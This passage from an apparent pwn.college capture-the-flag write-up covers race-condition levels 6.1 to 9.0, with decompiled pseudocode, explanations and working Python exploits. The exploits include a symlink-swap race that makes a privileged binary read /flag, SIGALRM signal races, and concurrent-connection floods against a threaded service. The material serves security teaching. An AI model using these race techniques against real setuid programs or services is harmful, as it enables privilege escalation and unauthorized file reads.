  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  v3 = strdup(argv[1]);
  v4 = dirname(v3);
  if ( (unsigned int)lstat(v4, &stat_buf) == -1 )
  {
    puts("Error: failed to get directory status!");
    exit(1);
  }
  if ( stat_buf.st_uid )
  {
    puts("Error: directory not owned by root!");
    exit(1);
  }
  if ( stat_buf.st_gid )
  {
    puts("Error: directory not group owned by root!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 2) != 0 )
  {
    puts("Error: other users are able to write in this directory!");
    exit(1);
  }
  v5 = open(argv[1], 0);
  v6 = read(v5, buf, 0x100uLL);
  write(1, buf, v6);
  puts("### Goodbye!");
  return 0;
}
```

Same binary logic as [level6.0](#level60) but with the `getchar()` pauses removed, making the race window microseconds wide.

The same path trick applies — `pivot/etc/passwd` where:

- `lstat("pivot/etc/passwd")` — `pivot` and `etc` are intermediate components followed freely, `passwd` is the final component checked — `/etc/passwd` is a real file ✓
- `lstat(dirname("pivot/etc/passwd"))` = `lstat("pivot/etc")` — `pivot` is intermediate so followed, `etc` is the final component — checks `/etc` itself, root-owned, no world-write ✓
- `open("pivot/etc/passwd")` — when `pivot` → `evilroot`, resolves to `evilroot/etc/passwd` → `/flag` ✓

Since there are no pauses, a background thread constantly swaps `pivot` between the good state (`/`) and the evil state (`./evilroot`) using `os.rename()` which is **atomic** — unlike `unlink` + `symlink`, `rename` replaces the target in a single kernel operation, avoiding the gap where the path doesn't exist at all. The sleep values bias the swap to spend more time in the good state (longer validation window) and less in the evil state (just long enough for `open()` to catch it).

```text
Good state: pivot -> /
  lstat("pivot/etc/passwd") = /etc/passwd = real file ✓
  lstat("pivot/etc")        = /etc        = root-owned ✓

Evil state: pivot -> ./evilroot
  open("pivot/etc/passwd")  = evilroot/etc/passwd -> /flag ✓
```

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, threading, os, time, warnings
warnings.filterwarnings("ignore")

TARGET = "/challenge/babyrace_level6.1"

# Cleanup
os.system("rm -rf pivot_good pivot_evil pivot evilroot")

# Evil tree: evilroot/etc/passwd -> /flag
os.mkdir("evilroot")
os.mkdir("evilroot/etc")
os.symlink("/flag", "evilroot/etc/passwd")

# Pre-create both symlinks
os.symlink("/", "pivot_good")
os.symlink("./evilroot", "pivot_evil")

# Initial state
os.symlink("/", "pivot")

def racer():
    while True:
        try:
            # GOOD STATE: pivot/etc/passwd -> /etc/passwd
            os.rename("pivot_good", "pivot")
            os.symlink("/", "pivot_good")

            # longer validation window
            time.sleep(0.003)

            # EVIL STATE: pivot/etc/passwd -> evilroot/etc/passwd -> /flag
            os.rename("pivot_evil", "pivot")
            os.symlink("./evilroot", "pivot_evil")

            # short open() window
            time.sleep(0.0003)

        except:
            pass

threading.Thread(target=racer, daemon=True).start()

print("[*] Starting exploit loop...")
attempt = 0

while True:
    attempt += 1

    p = subprocess.run(
        [TARGET, "pivot/etc/passwd"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
    )

    out = p.stdout.decode(errors="ignore")

    if attempt % 100 == 0:
        print(f"[*] Attempt {attempt}...")

    if "pwn.college{" in out:
        print("[+] Got the flag!")
        print(out)
        break
```

```text
hacker@race-conditions~level6-1:~$ python ~/script.py
[*] Starting exploit loop...
[*] Attempt 100...
[*] Attempt 200...
[*] Attempt 300...
[*] Attempt 400...
[*] Attempt 500...
[*] Attempt 600...
[*] Attempt 700...
[*] Attempt 800...
[*] Attempt 900...
[*] Attempt 1000...
[*] Attempt 1100...
[*] Attempt 1200...
[*] Attempt 1300...
[*] Attempt 1400...
[*] Attempt 1500...
[*] Attempt 1600...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level6.1!
###

pwn.college{gdJUNlscBjleeiCj6Lg_IeFOHWs.0lMxQDL4ITM0EzW}
### Goodbye!
```

&nbsp;

## level7.0

> Exploit a race condition in a more realistic scenario to affect program behavior.

```text
hacker@race-conditions~level7-0:~$ /challenge/babyrace_level7.0
###
### Welcome to /challenge/babyrace_level7.0!
###

Privilege level: 0
[*] Function (login/logout/win_authed/quit):
```

### Source code analysis

```c title="/challenge/babyrace_level7.0 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  challenge((unsigned int)argc, argv, envp);
  puts("### Goodbye!");
  return 0;
}
```

```c title="/challenge/babyrace_level7.0 :: challenge() :: Pseudocode" showLineNumbers
int challenge()
{
  int result; // eax
  char s1[136]; // [rsp+20h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+A8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  signal(14, timeout_handler);
  while ( 1 )
  {
    printf("Privilege level: %d\n", (unsigned int)privilege_level);
    puts("[*] Function (login/logout/win_authed/quit): ");
    __isoc99_scanf("%127s", s1);
    result = strcmp(s1, "quit");
    if ( !result )
      return result;
    if ( !strcmp(s1, "login") )
    {
      puts("Privilege level set to 1.");
      puts("Paused (press enter to continue)");
      __isoc99_scanf("%7s", &pause_buffer);
      privilege_level = 1;
      puts("You will be logged out in 10 minutes!");
      alarm(0x258u);
    }
    else if ( !strcmp(s1, "logout") )
    {
      if ( privilege_level )
      {
        puts("Dropping one privilege level.");
        puts("Paused (press enter to continue)");
        __isoc99_scanf("%7s", &pause_buffer);
        --privilege_level;
      }
      else
      {
LABEL_11:
        puts("You are not logged in!");
      }
    }
    else if ( !strcmp(s1, "win_authed") )
    {
      if ( !privilege_level )
        goto LABEL_11;
      if ( privilege_level == 1 )
        puts("Your privilege level is too low!");
      else
        win();
    }
    else
    {
      puts("Unrecognized choice!");
    }
  }
}
```

```c title="/challenge/babyrace_level7.0 :: win() :: Pseudocode" showLineNumbers
__uid_t win()
{
  int *v0; // rax
  char *v1; // rax
  __uid_t result; // eax
  int *v3; // rax
  char *v4; // rax

  puts("You win! Here is your flag:");
  flag_fd_5683 = open("/flag", 0);
  if ( flag_fd_5683 >= 0 )
  {
    flag_length_5684 = read(flag_fd_5683, &flag_5682, 0x100uLL);
    if ( flag_length_5684 > 0 )
    {
      write(1, &flag_5682, flag_length_5684);
      return puts("\n");
    }
    else
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      return printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
    }
  }
  else
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", v1);
    result = geteuid();
    if ( result )
    {
      puts("  Your effective user id is not 0!");
      return puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
  }
  return result;
}
```

The `win_authed` command calls `win()` only when `privilege_level` is neither `0` nor `1`:

```c
if (!privilege_level)        // 0 → "not logged in"
    goto LABEL_11;
if (privilege_level == 1)    // 1 → "too low"
    puts("Your privilege level is too low!");
else
    win();                   // anything else → win
```

`login` always sets `privilege_level = 1` and `logout` always decrements it. Through normal sequential execution the only reachable values are `0` and `1` — never anything that triggers `win()`.

### Signal Race

The `timeout_handler` registered via `signal(SIGALRM, timeout_handler)` sets `privilege_level = 0` asynchronously when `SIGALRM` fires.

The `logout` function has a critical TOCTOU window:

```text
1. Check:  if (privilege_level != 0) → passes when privilege_level = 1
2. Pause:  scanf("%7s", &pause_buffer)  ← WINDOW
3. Read:   eax = privilege_level
4. Write:  privilege_level = eax - 1
```

The check at step 1 and the actual read at step 3 are not atomic — the pause sits between them. If we fire `SIGALRM` during this window, `timeout_handler` sets `privilege_level = 0` between the check and the read. Then logout reads `0` and writes `-1`.

`-1` is neither `0` nor `1`, so `win_authed` calls `win()`.

```text
Timeline:
  privilege_level = 1
  logout: check → 1 != 0 ✓ → pause
  SIGALRM fires → timeout_handler → privilege_level = 0
  logout resumes → reads 0 → writes -1
  win_authed: -1 != 0 and -1 != 1 → win() ✓
```

We send `SIGALRM` directly to the process using `os.kill(proc.pid, signal.SIGALRM)` during the logout pause window.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, threading, time, signal, os

proc = subprocess.Popen(
    ["/challenge/babyrace_level7.0"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    close_fds=True
)

def reader():
    while True:
        line = proc.stdout.readline()
        if not line:
            break
        print(line.decode(errors='replace'), end='', flush=True)

threading.Thread(target=reader, daemon=True).start()

def send(s):
    proc.stdin.write((s + "\n").encode())
    proc.stdin.flush()

send("login")
time.sleep(0.15)
send("x")
time.sleep(0.1)

send("logout")
time.sleep(0.15)

os.kill(proc.pid, signal.SIGALRM)
time.sleep(0.05)

send("x")
time.sleep(0.1)

send("win_authed")
time.sleep(0.5)

send("quit")
proc.stdin.close()
proc.wait()
```

```text
hacker@race-conditions~level7-0:~$ python ~/script.py
###
### Welcome to /challenge/babyrace_level7.0!
###

Privilege level: 0
[*] Function (login/logout/win_authed/quit): 
Privilege level set to 1.
Paused (press enter to continue)
You will be logged out in 10 minutes!
Privilege level: 1
[*] Function (login/logout/win_authed/quit): 
Dropping one privilege level.
Paused (press enter to continue)
Logging out due to timeout.
Privilege level: -1
[*] Function (login/logout/win_authed/quit): 
You win! Here is your flag:
pwn.college{w1Gzb1UENa_4IiGlXEFCwgyfKui.01MxQDL4ITM0EzW}
Privilege level: -1
[*] Function (login/logout/win_authed/quit): 
### Goodbye!
```

&nbsp;

## level7.1

> Exploit a race condition in a more realistic scenario to affect program behavior.

```text
hacker@race-conditions~level7-1:~$ /challenge/babyrace_level7.1
###
### Welcome to /challenge/babyrace_level7.1!
###

Privilege level: 0
[*] Function (login/logout/win_authed/quit):
```

### Source code analysis

```c title="/challenge/babyrace_level7.1 :: challenge() :: Pseudocode" showLineNumbers
int challenge()
{
  int result; // eax
  char s1[136]; // [rsp+20h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+A8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  signal(14, timeout_handler);
  while ( 1 )
  {
    printf("Privilege level: %d\n", (unsigned int)privilege_level);
    puts("[*] Function (login/logout/win_authed/quit): ");
    __isoc99_scanf("%127s", s1);
    result = strcmp(s1, "quit");
    if ( !result )
      break;
    if ( !strcmp(s1, "login") )
    {
      privilege_level = 1;
      alarm(0x258u);
    }
    else if ( !strcmp(s1, "logout") )
    {
      if ( privilege_level )
      {
        puts("Dropping one privilege level.");
        --privilege_level;
      }
    }
    else if ( !strcmp(s1, "win_authed") )
    {
      if ( privilege_level )
      {
        if ( privilege_level == 1 )
          puts("Your privilege level is too low!");
        else
          win();
      }
      else
      {
        puts("You are not logged in!");
      }
    }
    else
    {
      puts("Unrecognized choice!");
    }
  }
  return result;
}
```

This is identical to [level7.0](#level70) with one critical difference: the `scanf` pauses inside `login` and `logout` are gone. The exploit logic is the same — we need `privilege_level` to reach `-1` — but without the pauses the race window is no longer seconds wide. It shrinks to a few CPU instructions.

The `logout` function still has a non-atomic read-modify-write:

```asm
1592: mov eax, [privilege_level]   ; read
1598: sub eax, 0x1                 ; modify
159b: mov [privilege_level], eax   ; write
```

And the check happens just before:

```asm
1558: mov eax, [privilege_level]
155e: test eax, eax
1560: je   LABEL_11
```

The race window is between `test eax,eax` (check sees 1) and `mov [privilege_level], eax` (decrement writes 0). If `SIGALRM` fires in that window, `timeout_handler` sets `privilege_level = 0`, and then the decrement writes `0 - 1 = -1`.

Without a pause, this window is only a few nanoseconds. The only way to hit it is to fire `SIGALRM` at extremely high frequency while hammering `logout` continuously, relying on probability to eventually land the signal in the right nanosecond.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, threading, time, signal, os

proc = subprocess.Popen(
    ["/challenge/babyrace_level7.1"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    close_fds=True
)

def reader():
    while True:
        line = proc.stdout.readline()
        if not line:
            break
        out = line.decode(errors='replace')
        print(out, end='', flush=True)
        if "pwn.college" in out:
            os._exit(0)

threading.Thread(target=reader, daemon=True).start()

def send(s):
    try:
        proc.stdin.write((s + "\n").encode())
        proc.stdin.flush()
    except:
        pass

def alarm_spammer():
    while True:
        try:
            os.kill(proc.pid, signal.SIGALRM)
        except:
            break
        time.sleep(0.0001)

threading.Thread(target=alarm_spammer, daemon=True).start()

send("login")
time.sleep(0.05)

while True:
    send("login")
    send("logout")
    send("win_authed")
```

```text
hacker@race-conditions~level7-1:~$ python ~/script.py
###
### Welcome to /challenge/babyrace_level7.1!
###

Privilege level: 0
[*] Function (login/logout/win_authed/quit):
...
Logging out due to timeout.
You are not logged in!
Privilege level: 0
[*] Function (login/logout/win_authed/quit):
Logging out due to timeout.
You win! Here is your flag:
Logging out due to timeout.
Logging out due to timeout.
Logging out due to timeout.
pwn.college{MkRZF-oW341A1-jwOETkEKxPY9_.0FNxQDL4ITM0EzW}
```

&nbsp;

## level8.0

> Exploit a race condition in a multi-threaded network service to affect program behavior.

```text
hacker@race-conditions~level8-0:~$ /challenge/babyrace_level8.0
###
### Welcome to /challenge/babyrace_level8.0!
###

This challenge is listening for connections on TCP port 1337.

The challenge supports unlimited parallel connections.
```

Unlike the previous challenges, this binary acts as a TCP server. Each incoming connection is handled in a separate thread, and all threads share the same global state.

### Source code analysis

The server accepts connections and creates a new thread for each client:

```c title="/challenge/babyrace_level8.0 :: main() :: Pseudocode" showLineNumbers
while ( 1 )
{
    v6 = accept(fd, 0LL, 0LL);

    arg = malloc(0x18uLL);
    *(_DWORD *)arg = v6;
    *((_DWORD *)arg + 1) = argc;
    *((_QWORD *)arg + 1) = argv;
    *((_QWORD *)arg + 2) = envp;

    pthread_create(&newthread, 0LL, run_thread, arg);
}
```

Each thread initializes its own socket streams and then enters the challenge logic:

```c title="/challenge/babyrace_level8.0 :: run_thread() :: Pseudocode" showLineNumbers
__int64 __fastcall run_thread(int *a1)
{
    __writefsqword(0xFFFFFFF0, (unsigned __int64)fdopen(*a1, "r"));
    __writefsqword(0xFFFFFFF8, (unsigned __int64)fdopen(*a1, "w"));

    setvbuf((FILE *)__readfsqword(0xFFFFFFF0), 0LL, 2, 0LL);
    setvbuf((FILE *)__readfsqword(0xFFFFFFF8), 0LL, 2, 0LL);

    return challenge(
        (unsigned int)a1[1],
        *((_QWORD *)a1 + 1),
        *((_QWORD *)a1 + 2)
    );
}
```

The actual vulnerability is inside `challenge()`:

```c title="/challenge/babyrace_level8.0 :: challenge() :: Pseudocode" showLineNumbers
while ( 1 )
{
    fprintf(..., "Privilege level: %d\n", privilege_level);

    fscanf(..., "%127s", s1);

    if (!strcmp(s1, "login"))
    {
        puts("Privilege level set to 1.");
        puts("Paused (press enter to continue)");
        fscanf(..., "%7s", &pause_buffer);

        privilege_level = 1;
    }
    else if (!strcmp(s1, "logout"))
    {
        if ( privilege_level )
        {
            puts("Dropping one privilege level.");
            puts("Paused (press enter to continue)");
            fscanf(..., "%7s", &pause_buffer);

            --privilege_level;
        }
    }
    else if (!strcmp(s1, "win_authed"))
    {
        if (!privilege_level)
            puts("You are not logged in!");
        else if (privilege_level == 1)
            puts("Your privilege level is too low!");
        else
            win();
    }
}
```

### Race Condition

The challenge uses a global `privilege_level` shared between all client threads.

Under normal execution the only reachable values are:

```text
0 = logged out
1 = logged in
```

The `win_authed` function only calls `win()` when the privilege level is neither `0` nor `1`:

```c
if (!privilege_level)
    puts("You are not logged in!");
else if (privilege_level == 1)
    puts("Your privilege level is too low!");
else
    win();
```

The vulnerability is in `logout()`:

```c
if ( privilege_level )
{
    fscanf(...);   // pause
    --privilege_level;
}
```

The check and decrement are separated by a blocking read. Since multiple client threads share the same global variable, two threads can both observe:

```text
privilege_level == 1
```

before either thread performs the decrement.

Timeline:

```text
Initial state:
    privilege_level = 1

Thread A:
    if (privilege_level)   -> true
    pause

Thread B:
    if (privilege_level)   -> true
    pause

Release A:
    --privilege_level
    1 -> 0

Release B:
    --privilege_level
    0 -> -1
```

Final result:

```text
privilege_level = -1
```

When `win_authed` executes:

```c
if (!privilege_level)      // false
if (privilege_level == 1)  // false
else
    win();                 // reached
```

The race allows us to reach the otherwise impossible state `privilege_level == -1`, triggering `win()`.

### Exploit

The attack uses three simultaneous client connections:

1. Connection A logs in and sets `privilege_level = 1`.
2. Connection B enters `logout()` and pauses before decrementing.
3. Connection C enters `logout()` and pauses before decrementing.
4. Both logout threads are released simultaneously.
5. The shared privilege level becomes `-1`.
6. Connection A invokes `win_authed`.

```python title="~/script.py" showLineNumbers
from pwn import *

HOST = "localhost"
PORT = 1337

# Connection A: login
a = remote(HOST, PORT)

a.recvuntil(b"quit):")
a.sendline(b"login")

a.recvuntil(b"continue)")
a.sendline(b"x")

# Connection B: logout
b = remote(HOST, PORT)

b.recvuntil(b"quit):")
b.sendline(b"logout")

b.recvuntil(b"continue)")

# Connection C: logout
c = remote(HOST, PORT)

c.recvuntil(b"quit):")
c.sendline(b"logout")

c.recvuntil(b"continue)")

# Release both logout threads
b.sendline(b"x")
c.sendline(b"x")

# Trigger win
a.recvuntil(b"quit):")
a.sendline(b"win_authed")

print(a.recvall(timeout=2).decode())
```

```
hacker@race-conditions~level8-0:~$ /challenge/babyrace_level8.0
```

```
hacker@race-conditions~level8-0:~$ python ~/script.py
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] Receiving all data: Done (155B)
[*] Closed connection to 127.0.0.1 port 1337
 
You win! Here is your flag:
pwn.college{8TBhM99j9jxFIFk0U4WKI2jGsRG.0VNxQDL4ITM0EzW}


Privilege level: -1
[*] Function (login/logout/win_authed/quit): 

[*] Closed connection to 127.0.0.1 port 1337
[*] Closed connection to 127.0.0.1 port 1337
```

&nbsp;

## level8.1

> Exploit a race condition in a multi-threaded network service with a much tighter timing window.

```text
hacker@race-conditions~level8-1:~$ /challenge/babyrace_level8.1
###
### Welcome to /challenge/babyrace_level8.1!
###

This challenge is listening for connections on TCP port 1337.

The challenge supports unlimited parallel connections.
```

This challenge is almost identical to [level8.0](#level80), but the pause inside the `logout()` function has been removed. Instead of manually synchronizing two threads, we must now win a much tighter race using a large number of concurrent client connections.

### Source code analysis

As in level8.0, the server creates a new thread for every incoming TCP connection:

```c title="/challenge/babyrace_level8.1 :: main() :: Pseudocode" showLineNumbers
while ( 1 )
{
    v6 = accept(fd, 0LL, 0LL);

    arg = malloc(0x18uLL);
    *(_DWORD *)arg = v6;
    *((_DWORD *)arg + 1) = argc;
    *((_QWORD *)arg + 1) = argv;
    *((_QWORD *)arg + 2) = envp;

    pthread_create(&newthread, 0LL, run_thread, arg);
}
```

Each client thread executes `challenge()`:

```c title="/challenge/babyrace_level8.1 :: challenge() :: Pseudocode" showLineNumbers
while ( 1 )
{
    fprintf(..., "Privilege level: %d\n", privilege_level);

    fscanf(..., "%127s", s1);

    if (!strcmp(s1, "login"))
    {
        privilege_level = 1;
    }
    else if (!strcmp(s1, "logout"))
    {
        if ( privilege_level )
        {
            --privilege_level;
        }
    }
    else if (!strcmp(s1, "win_authed"))
    {
        if ( privilege_level )
        {
            if ( privilege_level == 1 )
                puts("Your privilege level is too low!");
            else
                win();
        }
        else
        {
            puts("You are not logged in!");
        }
    }
}
```

The goal is still to reach:

```c
if ( privilege_level )
{
    if ( privilege_level == 1 )
        puts("Your privilege level is too low!");
    else
        win();
}
```

Any privilege level other than `0` or `1` reaches `win()`.

### Race Condition

The global variable `privilege_level` is shared across all client threads.

In level8.0 the race window was intentionally enlarged:

```c
if ( privilege_level )
{
    pause();
    --privilege_level;
}
```

allowing two logout threads to be synchronized manually.

In level8.1 the pause has been removed:

```c
if ( privilege_level )
{
    --privilege_level;
}
```

However, the decrement is still not protected by any mutex or synchronization primitive. Multiple threads can simultaneously read and modify the same global variable.

By continuously issuing large numbers of concurrent `login`, `logout`, and `win_authed` requests, multiple logout threads eventually race with one another and drive the privilege level below zero:

```text
privilege_level = 1
privilege_level = 0
privilege_level = -1
privilege_level = -4
privilege_level = -9
...
```

Once the privilege level becomes any value other than `0` or `1`, a concurrent `win_authed` request reaches:

```c
else
    win();
```

and prints the flag.

### Exploit

Instead of carefully synchronizing two connections, we flood the server with concurrent requests:

* Login threads continuously set `privilege_level = 1`.
* Logout threads continuously decrement the shared value.
* Win threads continuously attempt `win_authed`.

Eventually a logout race produces a negative privilege level and one of the win threads successfully reaches `win()`.

```python title="~/script.py" showLineNumbers
from pwn import *
import threading
import time

HOST = "127.0.0.1"
PORT = 1337

found = False

def login_worker():
    while not found:
        try:
            r = remote(HOST, PORT, level='error')
            r.recvuntil(b"quit):")
            r.sendline(b"login")
            r.close()
        except:
            pass

def logout_worker():
    while not found:
        try:
            r = remote(HOST, PORT, level='error')
            r.recvuntil(b"quit):")
            r.sendline(b"logout")
            r.close()
        except:
            pass

def win_worker():
    global found

    while not found:
        try:
            r = remote(HOST, PORT, level='error')
            r.recvuntil(b"quit):")
            r.sendline(b"win_authed")

            data = r.recvrepeat(0.2)

            if b"pwn.college{" in data:
                found = True
                print(data.decode(errors="replace"))
                return

            r.close()
        except:
            pass

print("[*] Starting race...")

threads = []

for _ in range(20):
    t = threading.Thread(target=login_worker, daemon=True)
    t.start()
    threads.append(t)

for _ in range(100):
    t = threading.Thread(target=logout_worker, daemon=True)
    t.start()
    threads.append(t)

for _ in range(20):
    t = threading.Thread(target=win_worker, daemon=True)
    t.start()
    threads.append(t)

while not found:
    time.sleep(1)
```

```
hacker@race-conditions~level8-1:~$ /challenge/babyrace_level8.1 
###
### Welcome to /challenge/babyrace_level8.1!
###

This challenge is listening for connections on TCP port 1337.

The challenge supports unlimited parallel connections.

```

```text
hacker@race-conditions~level8-1:~$ python ~/script.py
[*] Starting race...
 
You win! Here is your flag:
pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}


Privilege level: -1
[*] Function (login/logout/win_authed/quit): 

 
You win! Here is your flag:
pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}


Privilege level: -9
[*] Function (login/logout/win_authed/quit): 

 
You win! Here is your flag:
pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}


Privilege level: -4
[*] Function (login/logout/win_authed/quit): 

 
You win! Here is your flag:
pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}


Privilege level: -5
[*] Function (login/logout/win_authed/quit): 
```

&nbsp;

## level9.0

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int optval; // [rsp+24h] [rbp-3Ch] BYREF
  int fd; // [rsp+28h] [rbp-38h]
  int v6; // [rsp+2Ch] [rbp-34h]
  pthread_t newthread; // [rsp+30h] [rbp-30h] BYREF
  void *arg; // [rsp+38h] [rbp-28h]
  struct sockaddr addr; // [rsp+40h] [rbp-20h] BYREF
  unsigned __int64 v10; // [rsp+58h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts("This challenge is listening for connections on TCP port 1337.\n");
  puts("The challenge supports unlimited parallel connections.\n");
  fd = socket(2, 1, 0);
  optval = 1;
  setsockopt(fd, 1, 15, &optval, 4u);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x539u);
  bind(fd, &addr, 0x10u);
  listen(fd, 1);
  signal(13, sigpipe_handler);
  while ( 1 )
  {
    v6 = accept(fd, 0LL, 0LL);
    arg = malloc(0x18uLL);
    *(_DWORD *)arg = v6;
    *((_DWORD *)arg + 1) = argc;
    *((_QWORD *)arg + 1) = argv;
    *((_QWORD *)arg + 2) = envp;
    pthread_create(&newthread, 0LL, run_thread, arg);
  }
}
```